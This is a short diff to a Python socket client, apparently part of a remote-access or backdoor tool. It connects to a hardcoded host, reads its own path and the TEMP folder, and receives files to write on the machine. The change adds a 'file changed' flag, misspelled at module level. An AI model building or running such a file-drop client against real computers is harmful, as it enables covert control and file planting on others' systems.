@@ -9,6 +9,7 @@ import os
 strHost = "10.5.29.45"
 # strHost = socket.gethostbyname("")
 intPort = 5689
+fileCHnaged = 0
 
 strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
@@ -89,6 +90,7 @@ def CheckIp(file_data):
             return True
 
 def upload(data):
+    global fileChanged
     intBuffer = int(data)
     file_data = decode_utf8(objSocket.recv(1024))
     check = CheckIp(file_data)
@@ -111,6 +113,7 @@ def upload(data):
                         i+=1
         
         objSocket.send(str.encode("Done!!!"))
+        fileChanged = 1
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
 
